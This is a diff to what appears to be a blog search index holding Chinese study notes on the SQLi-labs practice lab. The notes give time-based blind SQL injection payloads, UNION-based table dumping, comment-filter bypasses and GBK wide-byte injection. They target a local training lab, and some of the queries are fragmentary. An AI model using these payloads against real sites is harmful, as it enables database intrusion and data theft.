@@ -60,4 +60,23 @@
 <p>一.基于错误数值的方法<br>1.先输入正确的查询                                     布尔型盲注、报错型注入<br>找出有几列<br>2.测试如何结束select语句<br>3.使用工具，第一个为列<br>二.时间延迟型盲注<br>?id&#x3D;1’ and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;’r’ ,sleep(5),1)–+<br>寻找数据库名称长度<br>and if(length(database())&#x3D;8,sleep(5),1) –+<br>二分法寻找数据库名<br>and if(ascii(substr(database(),第几位,1))&gt;码,sleep(5),1) –+<br>寻求有几个tables<br>and if((select count(table_name) from information_schema.tables<br> where table_schema&#x3D;database(),1)&#x3D;4,sleep(10),1) –+<br>测试tables<br>and if(left((select table_name from information_schema.tables where table))<br>ru<br>select语句永远在括号里<br>确定名称用二分法   二分法求database<br>count数数<br>解题<br>1.四个表<br>2.<a href="http://localhost/sqlilabs/Less-5/?id=1&#39;">http://localhost/sqlilabs/Less-5/?id=1&#39;</a> and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1))&#x3D;8,sleep(5),1) –+<br>ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()<br>limit 从零开始为表名称，1开始为个数),1开始为第几个字母，1开始为字母个数))二分法 –+</p>
 ]]></content>
   </entry>
+  <entry>
+    <title></title>
+    <url>/2022/11/12/sqlilabs%E7%AC%AC28%E5%85%B3/</url>
+    <content><![CDATA[<p>测试语句union select 1,2,3</p>
+<p>查表union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();%00</p>
+<p>sqlilabs第28关</p>
+<p>闭合方式为’)</p>
+<p>过滤了注释符，用;%00代替</p>
+<p>过滤了union select使用union all select</p>
+<p>sqlilabs第32关 宽字符注入</p>
+<p>观察得到过滤了grep_quote以及它没包括的&#x2F;,过滤了’以及”</p>
+<p>观察得到SET NAMES gbk，转义编码\为5c,使用一个其他编码使其成为一个汉字，例如%df</p>
+<p>绕过成功</p>
+<p>sqlilabs第三十六关</p>
+<p>观察得到SET NAMES gbk，</p>
+<p>使用的是mysql_real_escape_string</p>
+<p>插入转移符号\x00,\n,\r,\ ‘,\ “,\x1a;</p>
+]]></content>
+  </entry>
 </search>
